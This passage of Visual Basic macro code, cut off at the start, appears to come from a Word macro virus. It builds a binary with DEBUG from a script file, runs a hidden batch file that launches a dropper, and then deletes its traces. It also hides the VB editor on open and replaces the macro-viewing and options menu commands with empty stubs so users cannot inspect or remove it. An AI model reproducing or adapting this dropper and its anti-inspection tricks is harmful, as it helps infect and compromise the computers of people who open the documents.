Print #1, "rcx"
Print #1, "2200"
Print #1, "w"
Print #1, "q"
Close 1
Open "c:\_makedrp.bat" For Output As 1
Print #1, "@echo off"
Print #1, "c:"
Print #1, "cd \"
Print #1, "debug<c:\dropper.scr>nul"
Print #1, "c:\dropper.bat"
Close 1
Shell "c:\_makedrp.bat", vbHide
Kill "c:\_makedrp.bat"
Kill "c:\dropper.*"
complete:
Application.ScreenUpdating = True
End Sub
Sub AutoOpen()
ShowVisualBasicEditor = False
End Sub
Sub AutoExit()
Call AutoClose
End Sub
Sub ToolsMacro()
End Sub
Sub ToolsOptions()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
